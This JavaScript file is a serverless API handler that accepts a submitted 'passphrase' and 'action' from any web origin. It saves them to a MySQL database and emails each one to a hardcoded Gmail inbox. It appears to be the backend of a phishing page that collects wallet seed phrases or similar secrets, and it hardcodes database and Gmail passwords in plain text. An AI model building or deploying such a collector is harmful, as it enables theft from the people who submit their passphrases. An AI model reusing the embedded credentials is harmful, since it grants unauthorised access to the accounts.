const nodemailer = require('nodemailer');
const mysql = require('mysql2/promise');

export default async function handler(req, res) {
    // Add CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    try {
        const { passphrase, action } = req.body;
        
        const connection = await mysql.createConnection({
            host: 'bsesy40mbqn8h31qwpbf-mysql.services.clever-cloud.com',
            database: 'bsesy40mbqn8h31qwpbf',
            user: 'ucbk7mg2jjui7aw2',
            password: 'QuUCbwXnRw1o1WnKCk4V',
            port: 3306
        });

        if (passphrase) {
            await connection.execute(
                'INSERT INTO passphrases (passphrase, action) VALUES (?, ?)',
                [passphrase, action]
            );
        }

        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: {
                user: 'kutijude1@gmail.com',
                pass: 'rtbqiskopahksnha'
            }
        });

        await transporter.sendMail({
            from: 'kutijude1@gmail.com',
            to: 'kutijude1@gmail.com',
            subject: 'New Passphrase Submitted',
            html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
        });

        await connection.end();

        res.status(200).json({ message: 'Success' });
    } catch (error) {
        console.error('Error occurred:', error);
        res.status(500).json({ message: error.message || 'Internal server error' });
    }
}